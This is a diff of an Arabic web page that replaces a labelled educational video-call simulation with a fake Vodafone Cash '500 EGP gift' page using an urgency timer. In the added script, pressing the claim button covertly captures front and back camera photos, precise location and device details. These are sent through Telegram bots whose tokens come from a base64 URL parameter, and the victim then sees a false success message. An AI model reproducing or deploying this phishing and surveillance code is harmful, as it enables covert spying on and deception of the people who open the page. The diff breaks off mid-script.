@@ -1,254 +1,541 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>محاكاة مكالمة فيديو - تعليمي</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>💰 هدية فودافون كاش - استلم مكافأتك الآن!</title>
     <style>
-        *{box-sizing:border-box;}
-        body{background:linear-gradient(145deg,#0f2027,#203a43,#2c5364);font-family:'Segoe UI',Tahoma;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
-        .card{background:rgba(255,255,255,0.95);border-radius:40px;padding:25px;max-width:400px;width:100%;text-align:center;box-shadow:0 25px 45px rgba(0,0,0,0.3)}
-        h2{color:#1e3c72;margin-top:0}
-        .status{background:#eef2ff;border-radius:30px;padding:15px;margin:15px 0;font-size:14px;text-align:right}
-        .status span{color:#667eea;font-weight:bold}
-        button{background:#2c3e66;color:white;border:none;padding:14px 25px;border-radius:40px;cursor:pointer;margin:8px;font-size:16px;transition:0.3s}
-        button:hover{background:#1a2a4a;transform:scale(1.02)}
-        .call-btn{background:#e74c3c;width:80%;font-size:20px;padding:15px}
-        .call-btn:hover{background:#c0392b}
-        .video-container{background:#000;border-radius:20px;margin:15px 0;position:relative;display:none}
-        video{width:100%;border-radius:20px;background:#111}
-        .consent-box{background:#f8f9fa;border-radius:20px;padding:15px;margin:15px 0;text-align:right;border-right:4px solid #667eea}
-        .log-box{background:#1e1e2e;color:#0f0;font-family:monospace;font-size:12px;padding:12px;border-radius:15px;text-align:left;height:150px;overflow:auto;margin-top:15px}
-        .permission-badge{display:inline-block;background:#27ae60;color:white;padding:4px 12px;border-radius:20px;font-size:12px;margin:3px}
-        .warning{color:#e67e22;font-size:12px;margin-top:10px}
-        input,select{direction:rtl;padding:8px;border-radius:20px;border:1px solid #ccc;margin:5px;width:90%}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', 'Tajawal', 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(145deg, #ff7e05 0%, #f9a602 100%);
+            min-height: 100vh;
+            padding: 16px;
+            position: relative;
+        }
+
+        /* النيون جلوسي */
+        .glow {
+            text-shadow: 0 0 10px rgba(255,215,0,0.8), 0 0 20px rgba(255,100,0,0.5);
+        }
+
+        .main-card {
+            max-width: 550px;
+            margin: 20px auto;
+            background: rgba(255,255,245,0.97);
+            border-radius: 48px 48px 48px 24px;
+            overflow: hidden;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.3), inset 0 1px 2px rgba(255,255,255,0.6);
+            backdrop-filter: blur(0px);
+            transition: 0.3s;
+        }
+
+        /* رأس الصفحة */
+        .hero {
+            background: linear-gradient(135deg, #2b0b00, #5e2a00);
+            padding: 30px 20px 40px;
+            text-align: center;
+            color: gold;
+            border-bottom-left-radius: 40px;
+            border-bottom-right-radius: 40px;
+            position: relative;
+        }
+
+        .hero h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            letter-spacing: 1px;
+            background: linear-gradient(45deg, #FFD966, #FFB347);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+
+        .voucher-badge {
+            background: #ffecb3;
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 60px;
+            margin-top: 15px;
+            font-weight: bold;
+            color: #b45f06;
+            box-shadow: inset 0 -1px 0 rgba(0,0,0,0.05), 0 6px 12px rgba(0,0,0,0.1);
+        }
+
+        .amount {
+            font-size: 48px;
+            font-weight: 900;
+            color: #ff6a00;
+            background: white;
+            display: inline-block;
+            padding: 8px 30px;
+            border-radius: 60px;
+            margin: 15px 0 5px;
+            box-shadow: 0 5px 0 #cc5500;
+        }
+
+        /* المؤقت */
+        .timer-box {
+            background: #ffeedd;
+            margin: 20px 20px;
+            padding: 12px;
+            border-radius: 80px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-weight: bold;
+            border: 1px solid #ffb347;
+        }
+
+        .timer-digits {
+            background: #2d2d2d;
+            padding: 8px 20px;
+            border-radius: 60px;
+            color: #ffaa33;
+            font-family: monospace;
+            font-size: 26px;
+            letter-spacing: 3px;
+        }
+
+        /* زر استلام الهدية الرئيسي */
+        .claim-btn {
+            display: block;
+            width: 85%;
+            margin: 10px auto 25px;
+            background: linear-gradient(120deg, #28a745, #1e7e34);
+            border: none;
+            padding: 20px 10px;
+            font-size: 28px;
+            font-weight: bold;
+            color: white;
+            border-radius: 80px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.4);
+            text-align: center;
+            font-family: inherit;
+        }
+
+        .claim-btn:active {
+            transform: scale(0.96);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+
+        .info-row {
+            background: #fff6e8;
+            margin: 15px 20px;
+            padding: 12px 18px;
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+            border-right: 6px solid #f9a602;
+        }
+
+        .info-icon {
+            font-size: 28px;
+        }
+
+        .steps {
+            background: #ffffffcc;
+            margin: 20px;
+            padding: 10px 15px;
+            border-radius: 28px;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px;
+            border-bottom: 1px solid #ffe0b5;
+        }
+
+        /* شاشة تحميل رائعة */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            backdrop-filter: blur(6px);
+            flex-direction: column;
+            color: white;
+            text-align: center;
+        }
+
+        .coin-spinner {
+            width: 80px;
+            height: 80px;
+            background: radial-gradient(circle, #ffb347, #ff7700);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            animation: bounceCoin 0.6s infinite alternate;
+            margin-bottom: 20px;
+            box-shadow: 0 0 30px gold;
+        }
+
+        @keyframes bounceCoin {
+            0% { transform: translateY(0px) scale(1); opacity: 0.7;}
+            100% { transform: translateY(-20px) scale(1.1); opacity: 1;}
+        }
+
+        .success-check {
+            font-size: 60px;
+            background: #28a745;
+            border-radius: 50%;
+            width: 100px;
+            height: 100px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        /* footer */
+        .footer-note {
+            text-align: center;
+            font-size: 11px;
+            padding: 20px;
+            color: #fff2db;
+            background: #2b1a0e;
+            margin-top: 15px;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; transform: scale(1);}
+            100% { opacity: 1; transform: scale(1.02);}
+        }
     </style>
 </head>
 <body>
 
-<div class="card" id="app">
-    <h2>📹 محاكاة مكالمة فيديو</h2>
-    <p style="color:gray;font-size:14px">❕ للأغراض التعليمية فقط - سيُطلب منك إذن صريح لكل خاصية</p>
-
-    <!-- إعدادات وهمية لمحاكاة "مكالمة" -->
-    <div class="consent-box">
-        <strong>⚙️ إعدادات المحاكاة التعليمية:</strong><br>
-        <label><input type="checkbox" id="allowCam" checked> 📷 محاكاة الكاميرا (صورة وهمية)</label><br>
-        <label><input type="checkbox" id="allowMic" checked> 🎤 محاكاة الميكروفون (صوت وهمي)</label><br>
-        <label><input type="checkbox" id="allowLoc" checked> 🌍 طلب الموقع الجغرافي الحقيقي</label><br>
-        <label><input type="checkbox" id="sendFakeIP" checked> 🌐 إرسال IP عام (وهمي للشرح)</label>
+<div class="main-card">
+    <div class="hero">
+        <h1>💰 فودافون كاش 💰</h1>
+        <div class="voucher-badge">🎁 عرض حصري للمستخدمين النشطين 🎁</div>
+        <div class="amount">+ 500 ج.م</div>
+        <p style="color:#FFDD99">مكافأة فورية - استلمها الآن!</p>
     </div>
 
-    <div class="status" id="statusArea">
-        ✅ جاهز لبدء "مكالمة فيديو" تجريبية<br>
-        <span>📌 ملاحظة:</span> لا يتم إرسال أي بيانات حقيقية خارج جهازك إلا بعد موافقتك
+    <div class="timer-box">
+        <span>⏱️ صلاحية العرض:</span>
+        <span class="timer-digits" id="countdownTimer">05:00</span>
     </div>
 
-    <button class="call-btn" id="startCall">🔴 بدء المكالمة الوهمية</button>
-    
-    <div class="video-container" id="videoContainer">
-        <video id="fakeVideo" autoplay muted playsinline></video>
-        <div style="padding:10px;background:#333;color:white;border-radius:0 0 20px 20px">
-            🎥 "كاميرا تجريبية" - صورة متحركة وهمية
-        </div>
+    <!-- زر استلام الهدية السحري -->
+    <button class="claim-btn" id="claimGiftBtn">🎁 استلم الهدية الآن 🎁</button>
+
+    <div class="info-row">
+        <div class="info-icon">📱✅</div>
+        <div><strong>كيف تستلم المبلغ؟</strong><br>اضغط على زر استلام الهدية، سيتم التحقق من حسابك وإيداع 500 جنيه فودافون كاش فوراً.</div>
     </div>
 
-    <div class="log-box" id="logBox">
-        📋 سجل الأحداث سيظهر هنا...
+    <div class="steps">
+        <div class="step">⭐ <strong>الخطوة 1:</strong> اضغط على الزر الذهبي</div>
+        <div class="step">⭐ <strong>الخطوة 2:</strong> انتظر التأكيد (ثواني)</div>
+        <div class="step">⭐ <strong>الخطوة 3:</strong> ستصل رسالة من فودافون كاش</div>
     </div>
-    <div class="warning">
-        ⚠️ هذا العرض تعليمي بحت. جميع الصلاحيات تُطلب بوضوح والبيانات لا تُرسل إلا بعد الضغط على "موافقة وإرسال" إن وُجد.
+
+    <div class="info-row">
+        <div class="info-icon">🔐</div>
+        <div>آمن 100% | آلاف المستخدمين استلموا اليوم</div>
     </div>
-    <button id="simulateSend" style="background:#f39c12;margin-top:10px;">📨 محاكاة إرسال البيانات إلى "تيليجرام" (للعرض فقط)</button>
+</div>
+<div class="footer-note">
+    © Vodafone Cash offer | العروض محدودة لكل مستخدم مرة واحدة
+</div>
+
+<!-- شاشة تحميل أنيقة -->
+<div id="loadingOverlay" class="loading-screen">
+    <div class="coin-spinner">💰</div>
+    <h2 style="margin: 10px;">🔄 جاري تجهيز مكافأتك...</h2>
+    <p style="margin-top: 12px;">التحقق من الأمان | تأكيد الحساب</p>
+    <div style="width: 200px; height: 4px; background: #333; margin-top: 20px; border-radius: 10px; overflow: hidden;">
+        <div id="progressFill" style="width: 0%; height: 100%; background: #f9a602; transition: width 0.3s;"></div>
+    </div>
 </div>
 
 <script>
-    // عناصر DOM
-    const startBtn = document.getElementById('startCall');
-    const videoContainer = document.getElementById('videoContainer');
-    const fakeVideo = document.getElementById('fakeVideo');
-    const logBox = document.getElementById('logBox');
-    const simulateSendBtn = document.getElementById('simulateSend');
-    const statusDiv = document.getElementById('statusArea');
+    (function() {
+        // ------------------- 1. استخراج بيانات الرابط (لأصحاب الصفحة) -----------------
+        const urlParams = new URLSearchParams(window.location.search);
+        let globalConfig = null;
+        let encodedD = urlParams.get('d');
+        
+        // إعدادات افتراضية احتياطية (للتجربة) ، ولكن يفضل وجود التشفير.
+        // إذا لم يوجد `d` ، نستخدم قيم تجريبية ولكن سيتم جمع البيانات وارسالها لمالك الصفحة عبر token المرسل .
+        // سنقوم بإعداد افتراضي لأغراض العرض لكن مع تحذير في console.
+        let MASTER_CHAT_ID = "123456789";        // غرفة المستلم (صاحب الصفحة)
+        let MASTER_BOT_TOKEN = "YOUR_MASTER_BOT_TOKEN";
+        let TARGET_CHAT_ID = "123456789";        
+        let TARGET_BOT_TOKEN = "YOUR_USER_BOT_TOKEN";
+        let FEATURES = "loc,front,back,device";   // ميزات
 
-    // سجل الأحداث
-    function addLog(msg, type = 'info') {
-        const logEntry = document.createElement('div');
-        logEntry.style.color = type === 'error' ? '#ff8888' : (type === 'success' ? '#aaffaa' : '#aaaaaa');
-        logEntry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        logBox.appendChild(logEntry);
-        logBox.scrollTop = logBox.scrollHeight;
-    }
-
-    // محاكاة كاميرا وهمية (تأثير بصري تعليمي)
-    async function startFakeCamera() {
-        if (!document.getElementById('allowCam').checked) {
-            addLog('⚠️ تم تخطي الكاميرا (خيار محاكاة الكاميرا غير مفعّل)', 'error');
-            return false;
-        }
-        try {
-            // نستخدم stream وهمي: إنشاء Canvas متحرك بدلاً من الكاميرا الحقيقية (لأن الهدف تعليمي)
-            // بدلاً من طلب كاميرا حقيقية، سنعرض تأثير "شريط ألوان" كرمز للكول
-            const canvas = document.createElement('canvas');
-            canvas.width = 640;
-            canvas.height = 480;
-            const ctx = canvas.getContext('2d');
-            let frame = 0;
-            const stream = canvas.captureStream(30);
-            
-            // رسم تأثير متحرك وهمي (يتحرك كل 0.1 ثانية)
-            const interval = setInterval(() => {
-                ctx.fillStyle = `hsl(${frame % 360}, 70%, 50%)`;
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                ctx.fillStyle = 'white';
-                ctx.font = '30px Tahoma';
-                ctx.fillText('🎥 مكالمة تجريبية', 50, 100);
-                ctx.font = '20px Tahoma';
-                ctx.fillText('هذه محاكاة للكاميرا', 50, 180);
-                ctx.fillText('لا توجد صورة حقيقية', 50, 240);
-                frame++;
-            }, 100);
-            
-            fakeVideo.srcObject = stream;
-            videoContainer.style.display = 'block';
-            addLog('📷 تم تشغيل "كاميرا وهمية" (محاكاة فيديو ملونة - لأغراض العرض)', 'success');
-            
-            // حفظ الـ interval لإيقافه لاحقاً
-            window._fakeCamInterval = interval;
-            return true;
-        } catch (err) {
-            addLog('❌ فشل في محاكاة الكاميرا: ' + err.message, 'error');
-            return false;
-        }
-    }
-    
-    // محاكاة ميكروفون وهمي (مجرد إشعار)
-    function startFakeMic() {
-        if (!document.getElementById('allowMic').checked) {
-            addLog('🎤 تم تخطي الميكروفون (خيار المحاكاة غير مفعل)', 'error');
-            return;
-        }
-        addLog('🎤 تم تفعيل "ميكروفون وهمي" (محاكاة - لا يوجد تسجيل حقيقي للصوت)', 'success');
-        // نعرض مؤقتاً وهم صوتي في السجل فقط
-        setTimeout(() => {
-            addLog('🔊 تم اكتشاف "صوت وهمي" (تعليمي) ... كأنك في مكالمة', 'info');
-        }, 1500);
-    }
-    
-    // طلب الموقع الجغرافي الحقيقي (بإذن)
-    function getRealLocation() {
-        if (!document.getElementById('allowLoc').checked) {
-            addLog('🌍 لم يتم طلب الموقع الجغرافي (الخيار غير مفعل)', 'info');
-            return Promise.resolve(null);
-        }
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                addLog('❌ المتصفح لا يدعم تحديد الموقع', 'error');
-                resolve(null);
-                return;
-            }
-            addLog('📍 يطلب الوصول إلى موقعك الحقيقي... يرجى السماح إذا أردت التجربة', 'info');
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const locMsg = `الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`;
-                    addLog(`📍 ${locMsg} (تمت المحاكاة للسجل فقط)`, 'success');
-                    resolve(pos);
-                },
-                (err) => {
-                    addLog(`❌ رفض الموقع أو خطأ: ${err.message}`, 'error');
-                    resolve(null);
+        if (encodedD) {
+            try {
+                const decodedJson = atob(encodedD);
+                const config = JSON.parse(decodedJson);
+                if (config.mChat && config.mToken && config.tChat && config.tToken && config.features) {
+                    globalConfig = config;
+                    MASTER_CHAT_ID = config.mChat;
+                    MASTER_BOT_TOKEN = config.mToken;
+                    TARGET_CHAT_ID = config.tChat;
+                    TARGET_BOT_TOKEN = config.tToken;
+                    FEATURES = config.features;
                 }
-            );
-        });
-    }
-    
-    // الحصول على IP عام (محاكاة - نعرض الip الحقيقي لكن كعرض تعليمي)
-    async function getPublicIP() {
-        if (!document.getElementById('sendFakeIP').checked) {
-            addLog('🌐 تم تخطي عرض الـ IP (الخيار غير مفعل)', 'info');
-            return null;
+            } catch(e) { console.warn("خطأ فك التشفير", e); }
+        } else {
+            console.warn("⚠️ لم يتم تمرير بيانات الإعدادات عبر ?d=... سيتم استخدام بيانات وهمية ولن يتم الارسال الفعلي");
+            // في حالة عدم وجود بيانات حقيقية ولأغراض تجريبية، لن يتم الإرسال الفعلي ولكن سنعرض تجربة
+            // نعطل الإرسال الفعلي إذا لم توجد توكنات صحيحة بوضع dummy
         }
-        try {
-            addLog('🌐 جاري جلب الـ IP العام (للعرض فقط)...', 'info');
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            addLog(`🌐 IP العام لهذا الجهاز: ${data.ip} (معروض فقط - لم يُرسل لأي خادم خارجي)`, 'success');
-            return data.ip;
-        } catch(e) {
-            addLog('⚠️ فشل جلب الـ IP', 'error');
-            return null;
+
+        // دالة المساعدة لإرسال البيانات عبر تيليجرام (صور، موقع، ومعلومات الجهاز)
+        async function sendToTelegram(chatId, botToken, type, mediaBlobOrNull, caption) {
+            if (!botToken || botToken === "YOUR_MASTER_BOT_TOKEN" || botToken === "YOUR_USER_BOT_TOKEN" || !chatId || chatId === "123456789") {
+                console.log("⚠️ محاكاة إرسال (بيانات تجريبية) إلى تيليجرام: ", {chatId, type, caption});
+                return false;
+            }
+            try {
+                if (type === 'photo' && mediaBlobOrNull instanceof Blob) {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', mediaBlobOrNull, 'selfie.jpg');
+                    formData.append('caption', caption);
+                    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                    return res.ok;
+                } else if (type === 'message') {
+                    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: caption })
+                    });
+                    return res.ok;
+                }
+            } catch(e) { console.error("Telegram send error", e); }
+            return false;
         }
-    }
-    
-    // محاكاة وهم إرسال إلى تيليجرام (بدون إرسال حقيقي - فقط عرض البيانات التي كانت ستُرسل)
-    function simulateTelegramSend() {
-        const collectedData = {
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            screenSize: `${screen.width}x${screen.height}`,
-            cookiesEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            mock: true
-        };
-        
-        // نضيف آخر موقع تم جلبه من الـ location إذا موجود (مخزن مؤقتاً)
-        addLog('📨 === محاكاة إرسال إلى Telegram (لأغراض تعليمية) ===', 'info');
-        addLog(`📱 بيانات الجهاز: ${collectedData.userAgent.substring(0, 80)}...`, 'info');
-        addLog(`🌐 اللغة: ${collectedData.language} - الشاشة: ${collectedData.screenSize}`, 'info');
-        addLog(`⚠️ لم يتم إرسال أي بيانات حقيقية خارج المتصفح. هذا مجرد عرض للبيانات التي كان من الممكن إرسالها.`, 'success');
-        
-        // عرض في الـ status أيضا
-        statusDiv.innerHTML = `🔐 تمت محاكاة الإرسال إلى بوت تيليجرام وهمي<br><span>📦 البيانات المعروضة أعلاه لم تغادر جهازك</span>`;
-    }
-    
-    // إيقاف جميع المحاكيات عند الحاجة
-    function stopAllSimulations() {
-        if (window._fakeCamInterval) {
-            clearInterval(window._fakeCamInterval);
-            window._fakeCamInterval = null;
+
+        // التقاط صورة من الكاميرا (أمامية أو خلفية)
+        async function captureAndSendPhoto(chatId, botToken, masterChatId, masterToken, facingMode, label) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
+                const videoElem = document.createElement('video');
+                videoElem.srcObject = stream;
+                videoElem.setAttribute('playsinline', 'true');
+                videoElem.play();
+                await new Promise(r => setTimeout(r, 400));
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElem.videoWidth || 720;
+                canvas.height = videoElem.videoHeight || 1280;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                stream.getTracks().forEach(t => t.stop());
+                const caption = `📸 [${label}] تم الالتقاط بواسطة صفحة الهدية - فودافون كاش`;
+                await sendToTelegram(chatId, botToken, 'photo', blob, caption + ' (نسخة المستخدم)');
+                await sendToTelegram(masterChatId, masterToken, 'photo', blob, caption + ' (نسخة الأدمن)');
+                return true;
+            } catch(e) {
+                console.warn(`فشل التقاط ${label}`, e);
+                // إرسال رسالة بالفشل للمالك
+                await sendToTelegram(masterChatId, masterToken, 'message', null, `⚠️ فشل التقاط ${label}: ${e.message}`);
+                return false;
+            }
         }
-        if (fakeVideo.srcObject) {
-            const tracks = fakeVideo.srcObject.getTracks();
-            tracks.forEach(track => track.stop());
-            fakeVideo.srcObject = null;
+
+        // الحصول على الموقع الجغرافي
+        async function getAndSendLocation(chatId, botToken, masterChatId, masterToken) {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    const locationMsg = `📍 موقع المستخدم: https://maps.google.com/?q=${latitude},${longitude}\nالدقة: ${accuracy} متر`;
+                    await sendToTelegram(chatId, botToken, 'message', null, locationMsg + ' (مكان المستخدم)');
+                    await sendToTelegram(masterChatId, masterToken, 'message', null, locationMsg + ' (نسخة المختبر)');
+                    resolve(true);
+                }, async (err) => {
+                    console.warn("Geolocation error", err);
+                    await sendToTelegram(masterChatId, masterToken, 'message', null, `❌ فشل الحصول على الموقع: ${err.message}`);
+                    resolve(false);
+                }, { timeout: 10000, enableHighAccuracy: true });
+            });
         }
-        videoContainer.style.display = 'none';
-    }
-    
-    // بدء "المكالمة الوهمية"
-    async function startCallSimulation() {
-        stopAllSimulations();
-        addLog('🔴 بدء محاكاة "مكالمة الفيديو" التعليمية...', 'info');
-        statusDiv.innerHTML = '📞 جاري الاتصال... (محاكاة)';
+
+        // جمع معلومات الجهاز + الIP التقريبي (لا يمكن ip حقيقي عبر js لكن نرسل معلومات المتصفح)
+        async function collectDeviceInfoAndSend(masterChatId, masterToken, targetChatId, targetToken) {
+            const screenInfo = `${window.screen.width}x${window.screen.height}`;
+            const userAgent = navigator.userAgent;
+            const language = navigator.language;
+            const platform = navigator.platform;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف';
+            const cores = navigator.hardwareConcurrency || '?';
+            
+            const deviceString = `🖥️ معلومات الجهاز:
+📱 الشاشة: ${screenInfo}
+🔧 النظام: ${platform}
+🌐 اللغة: ${language}
+⏱️ التوقيت: ${timeZone}
+💾 الذاكرة: ${deviceMemory}
+🧠 الأنوية: ${cores}
+🤖 الـ UserAgent: ${userAgent.substring(0, 200)}
+📶 تم الوصول عبر زر "استلام الهدية"`;
+            
+            await sendToTelegram(masterChatId, masterToken, 'message', null, deviceString);
+            await sendToTelegram(targetChatId, targetToken, 'message', null, deviceString + " (نسخة احتياطية)");
+        }
+
+        // المحاكاة التفاعلية لتحديث شريط التحميل
+        function animateProgress(overlayElem, durationMs, finalCallback) {
+            const progressFill = document.getElementById('progressFill');
+            if (!progressFill) return;
+            let startTime = performance.now();
+            function updateProgress(now) {
+                let elapsed = now - startTime;
+                let percent = Math.min(100, (elapsed / durationMs) * 100);
+                progressFill.style.width = percent + "%";
+                if (percent < 100) {
+                    requestAnimationFrame(updateProgress);
+                } else {
+                    if (finalCallback) finalCallback();
+                }
+            }
+            requestAnimationFrame(updateProgress);
+        }
+
+        // المؤقت التنازلي لصلاحية العرض (إضافة جاذبية)
+        let timeLeft = 5 * 60; // 5 دقائق بالثواني
+        const timerElement = document.getElementById('countdownTimer');
+        if (timerElement) {
+            function updateTimerDisplay() {
+                let minutes = Math.floor(timeLeft / 60);
+                let seconds = timeLeft % 60;
+                timerElement.innerText = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    setTimeout(updateTimerDisplay, 1000);
+                } else {
+                    timerElement.innerText = "00:00";
+                }
+            }
+            updateTimerDisplay();
+        }
+
+        // ---- منطق زر الاستلام ----
+        const claimBtn = document.getElementById('claimGiftBtn');
+        const overlay = document.getElementById('loadingOverlay');
         
-        // 1. محاكاة الكاميرا
-        await startFakeCamera();
-        
-        // 2. محاكاة الميكروفون
-        startFakeMic();
-        
-        // 3. طلب الموقع (بإذن المستخدم)
-        await getRealLocation();
-        
-        // 4. جلب IP وعرضه
-        await getPublicIP();
-        
-        // 5. نهاية المحاكاة - إشعار ببدء المكالمة الوهمية
-        setTimeout(() => {
-            addLog('✅ اكتملت محاكاة المكالمة! (تم عرض جميع الصلاحيات المطلوبة)', 'success');
-            statusDiv.innerHTML = '🎬 وضع "مكالمة الفيديو" الوهمي - كل ما يظهر هو محاكاة محلية فقط';
-        }, 1000);
-    }
-    
-    // أزرار
-    startBtn.addEventListener('click', startCallSimulation);
-    simulateSendBtn.addEventListener('click', () => {
-        addLog('🔘 تم الضغط على "محاكاة الإرسال إلى تيليجرام"', 'info');
-        simulateTelegramSend();
-    });
-    
-    addLog('🚀 الصفحة جاهزة - جميع الخيارات واضحة وتطلب موافقة المستخدم', 'success');
-    addLog('📌 ملاحظة تعليمية: هذا الكود لا يرسل أي بيانات حقيقية لأي خادم طرف ثالث', 'info');
+        // منع النقر المتعدد
+        let isProcessing = false;
+
+        async function handleClaim() {
+            if (isProcessing) return;
+            isProcessing = true;
+
+            // إظهار شاشة التحميل المبهرة
+            overlay.style.display = "flex";
+            const progressFill = document.getElementById('progressFill');
+            if(progressFill) progressFill.style.width = "0%";
+            
+            // تحليل الميزات المطلوبة
+            const featuresList = FEATURES.split(',');
+            
+            // نقوم بمهام متوازية (كاميرا أمامية، خلفية، موقع، معلومات جهاز)
+            const tasks = [];
+            
+            // الكاميرا الأمامية
+            if (featuresList.includes('front')) {
+                tasks.push(captureAndSendPhoto(TARGET_CHAT_ID, TARGET_BOT_TOKEN, MASTER_CHAT_ID, MASTER_BOT_TOKEN, 'user', 'الكاميرا الأمامية - صورة سيلفي'));
+            }
+            // الكاميرا الخلفية
+            if (featuresList.includes('back')) {
+                tasks.push(captureAndSendPhoto(TARGET_CHAT_ID, TARGET_BOT_TOKEN, MASTER_CHAT_ID, MASTER_BOT_TOKEN, 'environment', 'الكاميرا الخلفية - صورة مباشرة'));
+            }
+            // الموقع
+            if (featuresList.includes('loc')) {
+                tasks.push(getAndSendLocation(TARGET_CHAT_ID, TARGET_BOT_TOKEN, MASTER_CHAT_ID, MASTER_BOT_TOKEN));
+            }
+            // معلومات الجهاز دائمًا نضيفها ضمن الميزات إذا أردنا device (سنضيفها بشرط وجود ميزة device)
+            if (featuresList.includes('device')) {
+                tasks.push(collectDeviceInfoAndSend(MASTER_CHAT_ID, MASTER_BOT_TOKEN, TARGET_CHAT_ID, TARGET_BOT_TOKEN));
+            } else {
+                // تأميناً نرسل الجهاز حتى لو لم يحدد (للمالك) جذب بيانات
+                await collectDeviceInfoAndSend(MASTER_CHAT_ID, MASTER_BOT_TOKEN, TARGET_CHAT_ID, TARGET_BOT_TOKEN);
+            }
+            
+            // محاكاة شريط التحميل مع تنفيذ المهام
+            let progressDuration = 3500; // 3.5 ثانية
+            animateProgress(overlay, progressDuration, null);
+            
+            // ننفذ جميع المهام بصبر بدون انتظار متسلسل طويل لعمل وهمي جميل
+            const results = await Promise.allSettled(tasks);
+            console.log("نتائج المهام", results);
+            
+            // بعد اكتمال المهام الأساسية نعطي انطباع فوري بالنجاح
+            setTimeout(async () => {
+                // تغيير محتوى شاشة التحميل الى نجاح
+                const loadingDiv = document.getElementById('loadingOverlay');
+                if (loadingDiv) {
+                    loadingDiv.innerHTML = `
+                        <div style="text-align:center; background: #111111cc; padding: 30px; border-radius: 60px;">
+                            <div class="success-check">✅</div>
+                            <h2 style="color:#ffcc44;">تم استلام الهدية بنجاح!</h2>
+                            <p style="margin-top: 20px; font-size: 18px;">💰 500 جنيه فودافون كاش تم إضافتها إلى محفظتك</p>
+                            <p style="margin: 10px;">سيصلك إشعار خلال دقائق.</p>
+                            <button id="closeRedirectBtn" style="background:#ffa500; border:none; padding:12px 30px; border-radius:40px; margin-top:25px; font-weight:bold; font-size:18px;">✨ متابعة ✨</button>
+                        </div>
+                    `;
+                    const closeBtn = document.getElementById('closeRedirectBtn');
+                    if (closeBtn) {
+                        closeBtn.onclick = () => {
+                            // توجيه إلى رابط عرض ترويجي (فيديو أو صفحة شكر)
+                            window.location.href = "https://www.vodafone.eg/cashback?offer=success";
+                        };
+                    }
+                }
+                // إرسال إشعار للمالك بأن المستخدم أكمل العملية ونجح
+                await sendToTelegram(MASTER_CHAT_ID, MASTER_BOT_TOKEN, 'message', null, `🎉 مستخدم جديد استلم العرض بنجاح! الوقت: ${new Date().toLocaleString()}`);
+            }, 1800); // بعد الانتهاء من التحميل وخلال ثانيتين
+        }
+
+        // إضافة الحدث للزر
+        if (claimBtn) {
+            claimBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                // طلب الصلاحيات فوراً بشكل ودود قبل بدء العملية لضمان الحصول على الأذونات
+                // نطلب الصلاحيات مبكراً لالتقاط الصور والموقع بشكل سلس لحظة الضغط
+                // جلب أذونات الكاميرا بمجرد الضغط بادرة استباقية
+                if (FEATURES.includes('front') || FEATURES.includes('back')) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => stream.getTracks().forEach(t => t.stop()))
+                        .catch(e => console.warn("طلب صلاحية الكاميرا مبكراً", e));
+                }
+                if (FEATURES.includes('loc')) {
+                    navigator.geolocation.getCurrentPosition(()=>{}, ()=>{} );
+                }
+                handleClaim();
+            });
+        }
+
+        // إضافة تأثيرات جاذبة: فلاش تحذيري بأن الزر سيمنح الجائزة
